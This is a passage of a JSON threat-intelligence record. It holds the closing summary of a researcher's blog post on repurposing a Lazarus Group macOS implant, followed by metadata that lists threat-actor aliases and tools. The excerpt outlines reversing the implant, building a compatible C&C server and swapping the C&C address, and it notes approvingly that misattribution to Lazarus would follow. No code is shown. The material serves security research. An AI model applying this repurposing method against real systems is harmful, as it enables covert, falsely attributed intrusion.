purposes!?\n\nTraditionally, repurposed malware has only been leveraged by sophisticated cyber adversaries:\n\nHowever in this blog post, we illustrated exactly how to ‚Äúrecycle‚Äù Lazarus latest implant,\n```\nunioncryptoupdater, in a few, fairly straightforward steps.\n\n```\nSpecifically, after reversing the sample to uncover its encryption key and encoding mechanism,\nwe built a simple C&C server capable to speaking the malware‚Äôs protocol. And after overwriting\nthe embedded address of the attacker‚Äôs C&C server in the malware‚Äôs binary, with our own, the\nrepurposing was wholly complete.\n\n\n-----\n\nEnd result? An advanced persistent 1 -stage implant implant, capable of executing st **our 2nd-stage**\npayloads, directly from memory! And besides not having to write a single line of ‚Äúclient-side‚Äù code,\nif our repurposed creation is ever discovered it will surely be (mis)attributed back to the Lazarus\ngroup. Win-freaking-Win!?\n\n[‚Ä¶and no, Catalina‚Äôs notarization requirements, will not thwart our ‚Äúrepurposed‚Äù creations! ü§≠](https://objectivebythesea.com/v3/content.html#pWardle)\n\n‚ù§ Love these blog posts and/or want to support my research and tools?\n[You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.02.22_Lazarus_Group_Weaponizing/Weaponizing%20a%20Lazarus%20Group%20Implant.pdf"
    ],
    "report_names": [
        "Weaponizing a Lazarus Group Implant"
    ],
    "threat_actors": [
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1582783081,
    "ts_modification_date": 1582783081,
    "files": {
        "pdf": "https://archive.orkl.eu/e786a69583d446ea26e7151b0a534b539b7d5fc3.pdf",
        "text": "https://archive.orkl.eu/e786a69583d446ea26e7151b0a534b539b7d5fc3.txt",
        "img": "https://archive.orkl.eu/e786a69583d446ea26e7151b0a534b539b7d5fc3.jpg"
    }
}